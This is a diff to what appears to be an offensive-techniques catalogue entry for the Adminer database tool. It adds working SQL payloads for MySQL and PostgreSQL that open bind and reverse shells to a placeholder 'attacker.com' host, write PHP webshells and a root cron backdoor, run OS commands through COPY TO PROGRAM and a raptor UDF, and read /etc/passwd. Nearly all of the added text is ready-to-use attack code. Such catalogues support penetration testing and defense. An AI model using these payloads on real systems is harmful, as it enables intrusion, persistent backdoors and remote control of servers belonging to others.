@@ -31,6 +31,20 @@ docker:
 
     '
 functions:
+  bind-shell:
+  - code: |
+      -- PostgreSQL: bind shell via COPY TO PROGRAM (requires superuser)
+      COPY (SELECT '') TO PROGRAM 'ncat -lvp 12345 -e /bin/sh &';
+    comment: |
+      PostgreSQL COPY TO PROGRAM opens a bind shell on TCP 12345 via ncat.
+      The & detaches ncat from the COPY command so it returns normally.
+      Connect with: nc victim.com 12345
+      Requires ncat (nmap package) on the PostgreSQL server host and superuser role.
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
   file-read:
   - code: "#!/usr/bin/env python3\n# Rogue MySQL server \u2014 reads an arbitrary\
       \ file from the Adminer host.\n# Usage: python3 rogue_mysql.py [target_file]\n\
@@ -67,6 +81,120 @@ functions:
       unauthenticated:
     version: |-
       <= 4.6.2
+  file-write:
+  - binary: false
+    code: "-- MySQL: write arbitrary text files via SELECT INTO OUTFILE\n-- (same\
+      \ FILE privilege requirement as the existing file-read entry)\nSELECT '<?php\
+      \ if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>'\nINTO OUTFILE '/var/www/html/shell.php';\n\
+      \n-- Write a cron backdoor (if MySQL runs as root):\nSELECT '* * * * * root\
+      \ bash -i >& /dev/tcp/attacker.com/12345 0>&1\\n'\nINTO OUTFILE '/etc/cron.d/backdoor';\n\
+      \n-- Note: OUTFILE will error if the file already exists \u2014 choose a new\
+      \ filename.\n"
+    comment: "MySQL SELECT INTO OUTFILE writes the query result to a file on the MySQL\
+      \ server host.\nRequires the FILE privilege and secure_file_priv='' or pointing\
+      \ to the target directory.\nOUTFILE adds OS-appropriate line endings \u2014\
+      \ use SELECT INTO DUMPFILE for binary content.\nCommon web root paths: /var/www/html\
+      \ (Debian/Ubuntu), /srv/http (Arch),\nC:/xampp/htdocs (XAMPP), C:/wamp64/www\
+      \ (WampServer).\n"
+    contexts:
+      admin:
+  - binary: false
+    code: |
+      -- PostgreSQL: write arbitrary files via COPY TO (requires superuser role)
+      COPY (SELECT '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>')
+      TO '/var/www/html/shell.php';
+
+      -- Read system files (COPY FROM reads a file into a table):
+      CREATE TEMP TABLE t (c text);
+      COPY t FROM '/etc/passwd';
+      SELECT * FROM t;
+    comment: "PostgreSQL COPY TO writes a query result to a file on the PostgreSQL\
+      \ server host.\nRequires superuser role. The file is owned by the postgres OS\
+      \ user.\nCOPY FROM reads a file into a table \u2014 effectively a file-read\
+      \ primitive.\nCombine with the rce entry to deploy a webshell if a PHP-capable\
+      \ web server\nshares the same host as the PostgreSQL instance.\n"
+    contexts:
+      admin:
+    platform: linux
+  rce:
+  - code: |
+      -- PostgreSQL: execute OS commands via COPY TO PROGRAM (requires superuser role)
+      -- Run directly in the Adminer SQL query interface connected to a PostgreSQL database:
+      COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
+      -- Read result:
+      COPY (SELECT pg_read_file('/tmp/pwned')) TO STDOUT;
+
+      -- Alternative: create a custom function mapping to libc system() (PostgreSQL < 14):
+      CREATE OR REPLACE FUNCTION sys(cstring) RETURNS int
+        AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
+      SELECT sys('id > /tmp/pwned2');
+    comment: "PostgreSQL's COPY TO PROGRAM (added in 9.3) passes the TO argument to\
+      \ /bin/sh -c,\nexecuting arbitrary OS commands as the PostgreSQL process user\
+      \ (commonly postgres).\nRequires the connected user to have superuser role in\
+      \ PostgreSQL.\nIn Adminer, connect to a PostgreSQL instance (local or remote)\
+      \ with superuser\ncredentials, navigate to the SQL query tab, and run the COPY\
+      \ statement directly.\nThe libc system() UDF alternative works on older PostgreSQL\
+      \ versions and requires\nthat /lib/x86_64-linux-gnu/libc.so.6 (or equivalent)\
+      \ is loadable as a PostgreSQL\nextension \u2014 effective on most Debian/Ubuntu\
+      \ PostgreSQL installations.\n"
+    contexts:
+      admin:
+    platform: linux
+  - code: |
+      -- MySQL: execute OS commands via User-Defined Function (UDF) using raptor_udf2
+      -- Requires: FILE privilege, SELECT INTO DUMPFILE on plugin dir, and MySQL running as root
+      -- Step 1: write the UDF shared library to the MySQL plugin directory:
+      SELECT @@plugin_dir;  -- confirm plugin directory path
+      SELECT 0x<hex_of_raptor_udf2.so> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
+
+      -- Step 2: create the UDF:
+      CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+
+      -- Step 3: execute a command:
+      SELECT do_system('id > /tmp/pwned');
+    comment: |
+      MySQL UDF (User-Defined Function) RCE: loads a compiled shared library as a MySQL
+      plugin to expose a function that calls system(). Requires:
+      - MySQL FILE privilege (to write the .so file via SELECT INTO DUMPFILE)
+      - Write access to @@plugin_dir (common when MySQL runs as root)
+      - raptor_udf2.so compiled for the target architecture
+        (github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
+      The hex string in SELECT INTO DUMPFILE must be the exact binary content of the .so
+      file. Use: xxd -p raptor_udf2.so | tr -d '\n' to generate the hex string.
+    contexts:
+      admin:
+    platform: linux
+  reverse-shell:
+  - blind: true
+    code: |
+      -- PostgreSQL: reverse shell via COPY TO PROGRAM (requires superuser role)
+      COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/attacker.com/12345 0>&1'' &';
+    comment: |
+      PostgreSQL COPY TO PROGRAM executes the supplied string via /bin/sh -c on the
+      PostgreSQL server host. The trailing & detaches the shell so COPY returns normally.
+      The shell runs as the postgres OS user. Requires superuser role.
+      Execute directly in the Adminer SQL query tab connected to a PostgreSQL database.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: "-- MySQL: reverse shell via UDF do_system() (after UDF setup \u2014 see\
+      \ rce entry)\nSELECT do_system('bash -c ''bash -i >& /dev/tcp/attacker.com/12345\
+      \ 0>&1'' &');\n\n-- Or via MySQL EVENT if UDF is unavailable (requires EVENT\
+      \ privilege):\nSET GLOBAL event_scheduler = ON;\nCREATE EVENT shell ON SCHEDULE\
+      \ AT CURRENT_TIMESTAMP + INTERVAL 1 SECOND\n  DO SELECT sys_exec('bash -i >&\
+      \ /dev/tcp/attacker.com/12345 0>&1');\n"
+    comment: |
+      MySQL reverse shell via the raptor UDF (see rce entry for setup steps).
+      The UDF do_system() calls system() with the shell command.
+      The trailing & detaches the process. Requires superuser and FILE privilege.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
   ssrf:
   - code: |
       # Navigate to the Adminer login page and select "Elasticsearch" as the system.
@@ -99,4 +227,21 @@ functions:
       unauthenticated:
     version: |-
       4.0.0 - 4.7.8
+  webshell:
+  - code: |
+      -- MySQL: deploy a PHP webshell via SELECT INTO OUTFILE
+      SELECT '<?php if(isset($_REQUEST["c"])){echo "<pre>",shell_exec($_REQUEST["c"]),"</pre>";}?>'
+      INTO OUTFILE '/var/www/html/shell.php';
+
+      -- Access the deployed webshell:
+      -- http://victim.com/shell.php?c=id
+    comment: |
+      Deploys a PHP webshell to the web server document root via MySQL OUTFILE.
+      Requires the MySQL FILE privilege and a permissive secure_file_priv setting.
+      The webshell runs as the web server user (www-data, apache, or daemon), which
+      may differ from the MySQL process user.
+      Adjust the OUTFILE path to match the target web root.
+      Access at: http://victim.com/shell.php?c=id
+    contexts:
+      admin:
 ...
